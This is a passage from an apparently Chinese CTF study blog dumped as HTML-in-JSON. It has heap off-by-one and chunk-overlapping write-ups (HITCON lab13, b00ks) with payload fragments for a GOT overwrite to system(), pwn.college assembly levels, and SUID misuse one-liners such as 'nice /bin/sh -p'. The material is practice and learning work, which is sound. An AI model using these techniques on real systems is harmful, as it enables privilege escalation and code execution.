class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buffer[<span class=\"number\">40</span>]=<span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *chunk1;</span><br><span class=\"line\">    chunk1=<span class=\"built_in\">malloc</span>(<span class=\"number\">24</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Get Input&quot;</span>);</span><br><span class=\"line\">    gets(buffer);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">strlen</span>(buffer)==<span class=\"number\">24</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">strcpy</span>(chunk1,buffer);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%882.30.56.png\" alt=\"截屏2021-12-08 下午2.30.56\"></p>\n<p>![截屏2021-12-08 下午2.32.03](/Users/rin/Library/Application Support/typora-user-images/截屏2021-12-08 下午2.32.03.png)</p>\n<p>这样next chunk的最低位就被0覆盖了。</p>\n<h3 id=\"chunk-overlapping\"><a href=\"#chunk-overlapping\" class=\"headerlink\" title=\"chunk overlapping\"></a>chunk overlapping</h3><p>​        off by one的一个比较简单的利用就是chunk overlapping，简单讲就是通过溢出将chunk的size位修改，导致几个连续的chunk的内存空间发生了重叠，借此可以泄露一些数据或者覆盖chunk指针。</p>\n<p>​        在举例子之前先复习一下与chunk size有关的一些操作。</p>\n<p>​        获取当前chunk size ：通过堆指针的直接获取size位</p>\n<p>​        获取当前chunk的use状态：通过当前chunk bp+chunk size获取下一个chunk的bp，然后获得prev_inuse位。</p>\n<p>​        获取前一个chunk size  ：利用当前chunk指针获取当前chunk的prev size。</p>\n<p>​        获取下一个chunk的地址 ：利用当前chunk的size，下一个chunk地址即为：当前chunk指针+size。</p>\n<p>​        获取前一个chunk的信息：先通过prev_size算出前一个chunl的堆指针，然后再利用前一个chunk的对指针来获得相关信息。</p>\n<h4 id=\"HITCON-Trainging-lab13\"><a href=\"#HITCON-Trainging-lab13\" class=\"headerlink\" title=\"HITCON Trainging lab13\"></a>HITCON Trainging lab13</h4><p><a href=\"https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13\">题目链接</a></p>\n<h5 id=\"逆向\"><a href=\"#逆向\" class=\"headerlink\" title=\"逆向\"></a>逆向</h5><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%888.42.17.png\" alt=\"截屏2021-12-08 下午8.42.17\"></p>\n<p>​        <code>edit()</code>中，可以输入的字符比规定的多了一个字节。</p>\n<p>​        程序并没有其他非常规的操作，就是单纯的off by one+chunk overlapping的利用。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">#思路如下</span><br><span class=\"line\">add chunk0#<span class=\"number\">0x18</span></span><br><span class=\"line\">add chunk1#<span class=\"number\">0x10</span></span><br><span class=\"line\">edit chunk1 size to <span class=\"number\">0x41</span></span><br><span class=\"line\"><span class=\"built_in\">free</span> chunk1</span><br><span class=\"line\">add chunk2<span class=\"meta\">#size = 0x30</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<p>​        对于每个heap，程序会申请0x10作为heap结构，然后再申请size大小作为content。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">create(<span class=\"number\">0x18</span>, <span class=\"string\">&quot;dada&quot;</span>)  <span class=\"comment\"># 0</span></span><br><span class=\"line\">create(<span class=\"number\">0x10</span>, <span class=\"string\">&quot;ddaa&quot;</span>)  <span class=\"comment\"># 1</span></span><br><span class=\"line\">这样操作以后内存应该是</span><br><span class=\"line\">chunk0/struct <span class=\"comment\">#0x10</span></span><br><span class=\"line\">chunk0/content <span class=\"comment\">#0x18</span></span><br><span class=\"line\">chunk1/struct<span class=\"comment\">#0x10</span></span><br><span class=\"line\">chunk1/content<span class=\"comment\">#0x10</span></span><br></pre></td></tr></table></figure>\n\n<p>​        申请的chunk0为0x18，原因是chunk都处于allocated状态，下一个chunk的<code>prev_size</code>无效，所以会被上一个chunk给内存复用。所以这里0x18是0x10的chunk0和0x8的chunk1的prevsize域。</p>\n<p>申请两个heap后内存布局如图。</p>\n<p>00-20是heap1的struct，20-40是heap1 content，其中，heap1 struct保存了指向heap1 content的指针。然后40-60是heap2 struct，60-80是heap2 content。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%889.23.24.png\"></p>\n<p>​        通过<code>edit(0, &quot;/bin/sh\\x00&quot; + &quot;a&quot; * *0x*10 + &quot;\\x41&quot;)</code>将chunk1的size覆盖为0x41。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%888.59.28.png\" alt=\"截屏2021-12-08 下午8.59.28\">        </p>\n<p>​        然后释放chunk1。</p>\n<p>​        释放chunk1后的内存如图。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%8810.45.36.png\" alt=\"截屏2021-12-08 下午10.45.36\"></p>\n<p>​    48开始可以直接理解为一个0x41的内存块。申请一个0x30的chunk2，属于fastbin，直接找到上次释放的0x41的chunk1分配给heap2，从048开始储存。我们的目的是修改chunk在结构chunk中保存content ptr为<code>free_got_addr</code>,并且要show（）出来，就要确保<code>free_got_addr</code>的位置是原来chunk1content开始的位置，也就是078。</p>\n<p>​        所以只需要利用chunk2，在合适的地方将free got addr填写到chunk1的content ptr处，chunk2的size是多少其实关系不大，只要大于8就行。</p>\n<p>​        当chunk1的content ptr被覆盖成了free got addr，show（1）实际上是读取这个ptr指向的地址的内容，也就是free的真实地址。同时也就相当于把chunk1的content ptr变为了free的真实地址，所以我们只需要修改chunk1的content，就能修改free的真实地址，将我们获得的<code>system()</code>的地址替换就行。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%889.31.45.png\" alt=\"截屏2021-12-08 下午9.31.45\"></p>\n<p>​        这样我们就获得了system·函数，要执行这个函数，只需要free一个含字符串<code>&quot;/bin/sh&quot;</code>的堆。也就是我们最开始add的工具人堆chunk0.</p>\n<p>​        这样基本就清楚了，但是还有一个问题我不是很理解，为什么在add chunk2的时候，chunk2的结构chunk的size位为0.或者说感觉根本没有结构chunk。</p>\n<h5 id=\"一些mzr\"><a href=\"#一些mzr\" class=\"headerlink\" title=\"一些mzr\"></a>一些mzr</h5><p>​        我超，我大彻大悟了。原来这么半年我一直理解错了何为堆叠。我理解错了啊！其实堆叠在动调中是看不到的，因为两个chunk完全被叠在了一起，就像我修改了chunk1的size1为41，这样heap1 struct和heap1 content就被叠成了0x41的空间，是叠成了0x41而不是struct把content覆盖了，如果这个时候申请内存空间的话，被叠起来的0x20的原本的content还是能够被申请到，所以我为什么chunk2的结构chunk离奇消失，就是因为被叠起来的0x20给隐藏了，然后再通过构造chunk2的content来伪造一个heap2struct，一切就说得通。</p>\n<p>​        再稍微细节一些，从代码中我们可以发现当我们free被堆叠的chunk1时，其实这个过程释放了两个chunk，一个是结构体chunk，是0x20size，另外一个是被修改为0x41的struct，然后两个chunk释放的先后顺序是先释放content，再释放struct，也就是fastbin中顺序是<code> struct（0x41）=&gt;content(0x20)</code></p>\n<p>​        这时候申请0x30的chunk2，首先需要申请0x20的struct，也就是被堆叠的heap1的content（这里存疑，如果fastbin的适配是smallest fit，那无话可说，但是似乎是first fit），然后再申请0x30的content，也就是被修改的0x41，这样就说得通了。</p>\n<p>​        但是很奇怪的一点，ctf-wiki上的说法却和这个不太一样，他认为将struct的size修改为0x41再free后，content就被struct吞并，而不是折叠了，free也只free一个0x41的chunk，而不是两个chunk。这个有待验证。</p>\n<p>​        我想通了，同时释放两个chunk是题目特地设置的，并且是必须要先释放content再释放struct才能达到效果。如果是先释放struct，0x41就会把content的所有chunk头之类的一并认为是user space然后释放，这样也就不存在content，自然就只释放一个堆块了。</p>\n<h5 id=\"一些动调\"><a href=\"#一些动调\" class=\"headerlink\" title=\"一些动调\"></a>一些动调</h5><p>​        exp打了。发现打不通。动调发现free的got表确实被被修改成<code>system()</code>，但是调用的时候似乎出现了问题，</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-09%20%E4%B8%8A%E5%8D%8810.32.49.png\" alt=\"截屏2021-12-09 上午10.32.49\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-09%20%E4%B8%8A%E5%8D%8810.51.22.png\" alt=\"截屏2021-12-09 上午10.51.22\"></p>\n<p>​        先检查问题是不是出现在<code>edit()</code>上</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-09%20%E4%B8%8A%E5%8D%8810.42.21.png\" alt=\"截屏2021-12-09 上午10.42.21\"></p>\n<p>​        跟进<code>edit()</code>，可以看到堆结构岿然不动，但是这是正常的。因为被修改的应该是free的got表，显然那种东西不会在这里。        </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-09%20%E4%B8%8A%E5%8D%8810.44.47.png\" alt=\"截屏2021-12-09 上午10.44.47\"></p>\n<p>​        rdi指向free的got表地址，got指向真实地址，似乎没有任何问题。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-09%20%E4%B8%8A%E5%8D%8810.54.46.png\" alt=\"截屏2021-12-09 上午10.54.46\"></p>\n<p>​        我悟了，问题所在就是，就是啥呢，就是我本地libc的符号和程序使用的对不上。所以getshell失败。好了，我爬了。</p>\n<p>​        </p>\n<p>​        （所以远端也打不通的原因是？）</p>\n<h4 id=\"Asis-CTF-2016-b00ks\"><a href=\"#Asis-CTF-2016-b00ks\" class=\"headerlink\" title=\"Asis CTF 2016 b00ks\"></a><a href=\"https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks\">Asis CTF 2016 b00ks</a></h4><p>Checksec:</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%883.40.30.png\" alt=\"截屏2021-12-08 下午3.40.30\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%883.49.14.png\" alt=\"截屏2021-12-08 下午3.49.14\"></p>\n<p>​        代码的逻辑相对来说有一些复杂，但是还是比较好逆的，管理book的结构体大概长这样：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">booklist</span>&#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> idx;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> *name;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> *description;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> size;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​        然后就是常规的菜单题的逻辑，也没有后门函数，估计需要ret2libc。值得注意的是：保护除了canary，其他都开了，这样的意义我尚且不清楚。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%884.39.02.png\" alt=\"截屏2021-12-08 下午4.39.02\"></p>\n<p>但是又联系到作者的名字是存贮在栈上的，也许可以利用。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%884.42.56.png\" alt=\"截屏2021-12-08 下午4.42.56\"></p>\n<p>​        <code>    my_read</code>函数有一个疑点就是每一次输入完成以后都会将buf的开始的地址至0。也就是每个利用到<code>my_read()</code>的地址，开头一个字节都是0。</p>\n<p>​        为了验证这一操作，我们动态调试一下。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%884.59.56.png\" alt=\"截屏2021-12-08 下午4.59.56\"></p>\n<p>​        操作没有验证到，反而发现一个很怪的东西，就是储存name和des的chunk的size并不是我们输入的，而是限定的0x20，也就是32。这样就对应了add函数最的一段：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%885.01.29.png\" alt=\"截屏2021-12-08 下午5.01.29\"></p>\n<p>​        对着伪代码摁逆确实没什么思路，但是动调一下思路就清晰了，程序将原本储存name或者des的堆指针赋给了size为0x20的chunk。但是这么做的目的何在？</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%885.17.28.png\" alt=\"截屏2021-12-08 下午5.17.28\"></p>\n<p>​        没辙了，没有一点思路。</p>\n<p>​        （偷偷看一眼wp，只看逆向部分）</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%885.26.54.png\" alt=\"截屏2021-12-08 下午5.26.54\"></p>\n<p>​        （不懂，为什么对于边界的考虑不当，我觉得挺当的qwq。wp说存在空字节溢出，那估计又是我想错了。呜呜，我想通了。就是这个*buf = 0，我是傻逼。）</p>\n<p>​        其实是最后一位被清0了，但是我一直想的是原本的buf的开始被清0。现在想通了，其实特别简单，就是当i等于32的时候，buf还自增了，然后才判结束循环，这时候又将末位置0，就相当于多输了一个0，造成了空字节溢出。</p>\n<p>​        （wp关闭，开始瞎写时间）</p>\n<p>ToBeContinue</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>稍微总结一下昨天的学习吧。</p>\n<p>其实虽然做了大概十个小时，但是只做了三个题不到，其中有大段时间在修复崩坏的环境以及研究pwndocker的一些问题，还有无谓的逆向，结果做不出。</p>\n<p>并且对于hicton lab 13这道题 ，一个简单的概念卡了我很久。</p>\n<p>现在看来，原因有2:我没有认真逆向。错过了很多我不以为意的内容，pwn题只要一个细节没有注意到就会被坑很久，所以还是那个老生常谈的话题，逆向。其实这个问题一方面是我逆向太不认真了，还有一方面是刷的题太少，甚至没办法总结规律。比如通过这两道题我总结出来的规律是：一般在普通的ptr = malloc（）之外还会特地创建一个struct用来管理每个表项的结构（我早就应该想到的），这个结构中通常会储存堆中的指针（我早就应该知道的，但是不知道为什么，我半年来一直没有意识到这个问题），所以我们覆盖的其实是堆struct chunk中储存的chunk bp，而不是实际的chunk bp（那个储存在哪里都不清楚捏）。</p>\n<p>然后就是还是对chunk以及bin的一些操作或者说数据结构不是非常了解，导致概念不清。所以我暂停一天刷题，然后把malloc lab的分离适配搞完。</p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n","categories":["HEAP - Off By One"],"tags":["heap_pro"]},{"title":"Assembly_Refresher","url":"/2022/01/29/pwncollege_Assembly_Refresher/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-QgpBVyPY\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n\n\n<h4 id=\"Level1\"><a href=\"#Level1\" class=\"headerlink\" title=\"Level1\"></a>Level1</h4><p>需要设置<code>*rdi = 0x1337</code>，</p>\n<p>如果是按照目的意思程序的汇编代码长这样子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.section .text</span><br><span class=\"line\">    .intel_syntax noprefix</span><br><span class=\"line\">    .global _start</span><br><span class=\"line\">    _start :</span><br><span class=\"line\">        mov rdi, 0x1337</span><br></pre></td></tr></table></figure>\n\n<p>但是可以直接用pwntools传输<code>mov rdi, 0x1337</code>这一句。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> pwn</span><br><span class=\"line\">pwn.context.log_level = <span class=\"string\">&quot;INFO&quot;</span></span><br><span class=\"line\">pwn.context.encoding = <span class=\"string\">&quot;latin&quot;</span></span><br><span class=\"line\">pwn.context.arch = <span class=\"string\">&quot;amd64&quot;</span></span><br><span class=\"line\">pwn.warnings.simplefilter(<span class=\"string\">&quot;ignore&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">assembly = <span class=\"string\">&quot;&quot;&quot;mov rdi, 0x1337&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">proc = pwn.process(<span class=\"string\">&quot;/challenge/embryoasm_level1&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(proc.readrepeat(<span class=\"number\">1</span>).decode())</span><br><span class=\"line\">proc.send(pwn.asm(assembly))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(proc.readrepeat(<span class=\"number\">1</span>).decode())</span><br></pre></td></tr></table></figure>\n\n<p>一个好用的exp，可以直接在非根目录下执行。</p>\n<h4 id=\"Level2\"><a href=\"#Level2\" class=\"headerlink\" title=\"Level2\"></a>Level2</h4><p><code>add rdi, 0x331337</code></p>\n<h4 id=\"Level3\"><a href=\"#Level3\" class=\"headerlink\" title=\"Level3\"></a>Level3</h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8A%E5%8D%8811.38.12.png\" alt=\"截屏2022-01-30 上午11.38.12\"></p>\n<p>出师未捷身先死。</p>\n<p>这里应该是对于汇编乘法对于寄存器的改变不太清楚<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8A%E5%8D%8811.48.15.png\" alt=\"截屏2022-01-30 上午11.48.15\"></p>\n<p>​        问题出在64位乘法会产生128位乘积，储存在<code>rdx:rax</code>中由于题目给的都是低32位的所以高32位全部是0，相当于<code>mul</code>之后<code>rdx</code>就变成了0，自然拿不到flag。</p>\n<h4 id=\"Level4\"><a href=\"#Level4\" class=\"headerlink\" title=\"Level4\"></a>Level4</h4><p>​        简单的64位汇编除法。相关的指令都已经给出了，抄作业就行。</p>\n<h4 id=\"Level5\"><a href=\"#Level5\" class=\"headerlink\" title=\"Level5\"></a>Level5</h4><p>​        依然是简单的除法，涉及到余数的处理。既然余数存在<code>rdx</code>，<code>mov rax，rdx</code>就行。</p>\n<h4 id=\"Level6\"><a href=\"#Level6\" class=\"headerlink\" title=\"Level6\"></a>Level6</h4><p>​        对于低位的数字运算（好烦），</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">rax = rdi modulo 256 \t\t\t;2^8</span><br><span class=\"line\">rbx = rsi module 65536\t\t;2^16</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%882.47.33.png\" alt=\"截屏2022-01-30 下午2.47.33\"></p>\n<p>所以edi和esi没有低八位吗？</p>\n<p>可能是吧，就像正常来说ebp和esp也没有低八位。</p>\n<h4 id=\"Level7\"><a href=\"#Level7\" class=\"headerlink\" title=\"Level7\"></a>Level7</h4><p>​        进行移位操作的练习，需要让rax为rdi的b3位的值</p>\n<p>​        </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%883.37.16.png\" alt=\"截屏2022-01-30 下午3.37.16\"></p>\n<h4 id=\"Level8\"><a href=\"#Level8\" class=\"headerlink\" title=\"Level8\"></a>Level8</h4><p>​        与操作。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%883.46.06.png\" alt=\"截屏2022-01-30 下午3.46.06\"></p>\n<h4 id=\"Level9\"><a href=\"#Level9\" class=\"headerlink\" title=\"Level9\"></a>Level9</h4><p>​        简单的奇偶判断，rax应该是1与rdi lsb异或后的结果。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%885.13.57.png\" alt=\"截屏2022-01-30 下午5.13.57\"></p>\n<h4 id=\"Level10\"><a href=\"#Level10\" class=\"headerlink\" title=\"Level10\"></a>Level10</h4><p>​        简单的间接寻址。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%885.33.10.png\" alt=\"截屏2022-01-30 下午5.33.10\"></p>\n<p>​            要注意的是这里面有一些规范，大概就是不能<code>mov [register],number;</code>。也就是说涉及到寄存器间接寻址的操作都不能用立即数，而是需要利用寄存器。</p>\n<h4 id=\"Level11\"><a href=\"#Level11\" class=\"headerlink\" title=\"Level11\"></a>Level11</h4><p>​        涉及对byte，word ，dword和qword的size的理解。<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%885.42.02.png\" alt=\"截屏2022-01-30 下午5.42.02\"></p>\n<h4 id=\"Level12\"><a href=\"#Level12\" class=\"headerlink\" title=\"Level12\"></a>Level12</h4><p>​        <del>我发现这个东西最恼人的不是做本身而是看题，不想看题好烦，题好长。但是只看问题又不能瞬间找到思路。。。</del></p>\n<p>​        考点是利用寄存器间接寻址设置寄存器的值为指定值。<del>（本来以为要考虑小端序造成的影响但其实不用考虑）</del></p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%885.52.50.png\" alt=\"截屏2022-01-30 下午5.52.50\"></p>\n<h4 id=\"Level13\"><a href=\"#Level13\" class=\"headerlink\" title=\"Level13\"></a>Level13</h4><p>​        也就是一个按照地址偏移寻址的方式的理解。（基址寻址）</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%889.46.14.png\" alt=\"截屏2022-01-30 下午9.46.14\"></p>\n<h4 id=\"Level14\"><a href=\"#Level14\" class=\"headerlink\" title=\"Level14\"></a>Level14</h4><p>​        对于出入栈相关指令的简单理解。</p>\n<p>​        做题的时候卡了一下，因为没有正确理解题意，我以为是需要把栈顶值减去rdi后的值存到rax中就行，但是题意其实是让我们改变栈顶的值，所以我们将rax取出减rdi后还需要push回去。（还是吃了英语不好的亏捏）</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%8810.11.05.png\" alt=\"截屏2022-01-30 下午10.11.05\"></p>\n<p>​        </p>\n<h4 id=\"Level15\"><a href=\"#Level15\" class=\"headerlink\" title=\"Level15\"></a>Level15</h4><p>​        还是围绕栈的先入后出的练习。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%8810.19.15.png\" alt=\"截屏2022-01-30 下午10.19.15\"></p>\n<p>​            </p>\n<h4 id=\"Level16\"><a href=\"#Level16\" class=\"headerlink\" title=\"Level16\"></a>Level16</h4><p>​        利用rsp来寻址。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%8810.36.37.png\" alt=\"截屏2022-01-30 下午10.36.37\"></p>\n<p>​        </p>\n<p>​        这里我把rdx清零了，属于是多此一举。</p>\n<h4 id=\"Level17\"><a href=\"#Level17\" class=\"headerlink\" title=\"Level17\"></a>Level17</h4><p>​        这题干怎么越来越长。</p>\n<p>​        等会儿再做。</p>\n<p>​        </p>\n","categories":["PWN.COLLEGE"],"tags":["pwncollege"]},{"title":"ProgramMisuse","url":"/2022/03/03/pwncollege_ProgramMisuse/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-ORdqQPpB\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n\n\n\n\n<p>​        关于这个module，做出题目的话大致有两个思路，一个是利用<code>/bin/sh</code>    来对整个shell提权，另外一个是利用设置了suid的特殊程序来读取flag。一般来说是第二个方法比较简单，但是有时候只有第一个方法可以行得通。</p>\n<h4 id=\"Level1\"><a href=\"#Level1\" class=\"headerlink\" title=\"Level1\"></a>Level1</h4><p>​        没有看视频，并不知道这个Misuse是什么意义，但是level1只要执行给的程序就能get flag。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-26%20%E4%B8%8B%E5%8D%884.56.40.png\" alt=\"截屏2022-01-26 下午4.56.40\"></p>\n<h4 id=\"Level2\"><a href=\"#Level2\" class=\"headerlink\" title=\"Level2\"></a>Level2</h4><p>​        到第二题大概懂它的用意了，来补充一些知识吧。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-26%20%E4%B8%8B%E5%8D%884.57.44.png\" alt=\"截屏2022-01-26 下午4.57.44\"></p>\n<p>​        可以看到原本我们只用普通用户权限，但是由于可执行程序将 <code>/usr/bin/more</code>    设置为了超级权限，使得这个功能能够读取到flag的内容。</p>\n<p>​        然后关于SUID，也就是Set uid ID。如果将对应位设置为S，就能够以可执行文件的owner权限执行它们。</p>\n<p>​        （SUID）仅对二进制可执行文件有效。</p>\n<p>参考：[<a href=\"https://www.cnblogs.com/sparkdev/p/9651622.html\">Linux 特殊权限 SUID,SGID,SBIT </a>]</p>\n<h4 id=\"Level3-9\"><a href=\"#Level3-9\" class=\"headerlink\" title=\"Level3-9\"></a>Level3-9</h4><p>​        <code>xxx flag</code></p>\n<h4 id=\"Level-10\"><a href=\"#Level-10\" class=\"headerlink\" title=\"Level 10\"></a>Level 10</h4><p>​        指令为<code>rev</code>，所以对于获得的flag我们需要翻转一下，可以就直接用<code>rev</code>来。</p>\n<h4 id=\"Level-11\"><a href=\"#Level-11\" class=\"headerlink\" title=\"Level 11\"></a>Level 11</h4><p>​        控制<code>od</code>的参数，并需要简单的脚本处理字符串的空格。</p>\n<h4 id=\"Level12-17\"><a href=\"#Level12-17\" class=\"headerlink\" title=\"Level12-17\"></a>Level12-17</h4><p>​        按照给的可执行文件来。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-28%20%E4%B8%8B%E5%8D%886.34.25.png\" alt=\"截屏2022-01-28 下午6.34.25\"></p>\n<p>​        之前碰到这个问题的时候并咩有理解，现在算是理解了。</p>\n<h4 id=\"Level21\"><a href=\"#Level21\" class=\"headerlink\" title=\"Level21\"></a>Level21</h4><p><code>ar -r a flag</code></p>\n<p><code>cat a</code></p>\n<h4 id=\"Level27\"><a href=\"#Level27\" class=\"headerlink\" title=\"Level27\"></a>Level27</h4><p><code>nice /bin/sh -p</code></p>\n<h4 id=\"Level28\"><a href=\"#Level28\" class=\"headerlink\" title=\"Level28\"></a>Level28</h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-02%20%E4%B8%8B%E5%8D%885.09.57.png\" alt=\"截屏2022-03-02 下午5.09.57\"></p>\n<h4 